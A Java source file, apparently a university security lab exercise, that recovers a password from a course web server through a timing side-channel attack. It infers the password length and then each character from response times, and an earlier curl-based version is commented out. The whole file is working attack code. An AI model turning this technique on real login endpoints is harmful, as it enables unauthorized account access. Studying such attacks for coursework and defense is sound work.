package ex01_M2;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;

public class ex01_M2 {

	static final String URL = "http://aoi.ise.bgu.ac.il/?user=305555179&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	final static char[] LETTERS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		int difficulty = 1;
		int attempts = 3;
		//		int len = findPasswordLength(3, difficulty);
		//		System.out.println("password length: "+len);

		String passwd = findPassword(attempts, difficulty); 
		System.out.println(passwd);
		//...
		//System.out.println(username + " " + password + " " + difficulty);
		//...
		//System.out.println("We have a problem");
	}

	public static int findPasswordLength(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double tmpReqTime = 0;
		String passwd;
		
		for (int i = 0; i < maxLen; i++) {
			reqTimes[i] = Double.MAX_VALUE;
		}
		
		for (int i = 0; i < attempts; i++) {
			 passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				tmpReqTime = getReqTime(URL+passwd+DIFFICULTY+difficulty);
				if (tmpReqTime < reqTimes[j]) {
					reqTimes[j] = tmpReqTime;
				}
				System.out.println("attempt: "+i+" length: "+(j+1)+" reqTime: "+reqTimes[j]);
			}
		}
		
		for (int i = 0; i < maxLen; i++) {
			System.out.println("length: "+(i+1)+" reqTime: "+reqTimes[i]);
			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i+1;
			}
		}
		
		System.out.println("passwd length: "+len);
		return len;
	}

	public static String findPassword(int attempts, int difficulty) {

		int len = findPasswordLength(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double tmpReqTime = 0;
		char currChar = '0';
		String passwd = "";
		String passSuff = new String(new char[len-1]).replace('\0', '0');
		
		for (int i = 0; i < lettersLen; i++) {
			reqTimes[i] = Double.MAX_VALUE;
		}
		
		for (int i = 0; i < len-1; i++) {
			maxReqTime = 0;
			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					tmpReqTime = getReqTime(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
					if (tmpReqTime < reqTimes[k]) {
						reqTimes[k] = tmpReqTime;
					}
					System.out.println("attempt: "+j+" passwd: "+passwd+LETTERS[k]+passSuff+" reqTime: "+tmpReqTime);
				}
				
			}
			
			for (int j = 0; j < lettersLen; j++) {
				System.out.println("passwd: "+passwd+LETTERS[j]+passSuff+" reqTime: "+reqTimes[j]);
				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					currChar = LETTERS[j];
				}
			}
			
			passwd += currChar;
			passSuff = passSuff.substring(1);
		}
		
		for (int i = 0; i < lettersLen; i++) {
			if(sendReq(URL+passwd+LETTERS[i]+DIFFICULTY+difficulty)) {
				passwd+=LETTERS[i];
				return passwd;
			}
		}
		
		return "";
	}

	/*

	public static boolean sendReq(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START+ url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			return stdInput.readLine().equals("1");

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}


	public static double getReqTime(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START+url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			stdInput.readLine();
			return Double.parseDouble(stdInput.readLine());

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
	 */

	public static boolean sendReq(String urlString) {

		try {
			URL url = new URL(urlString);
			URLConnection conn = url.openConnection();
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

			boolean res = stdInput.readLine().equals("1");
			stdInput.close();

			return res;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}


	public static double getReqTime(String urlString) {
		try {

			long milliStart = System.currentTimeMillis();

			URL url = new URL(urlString);
			URLConnection conn = url.openConnection();
			conn.getInputStream();
			
			long milliEnd = System.currentTimeMillis();

			return milliEnd - milliStart;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
}

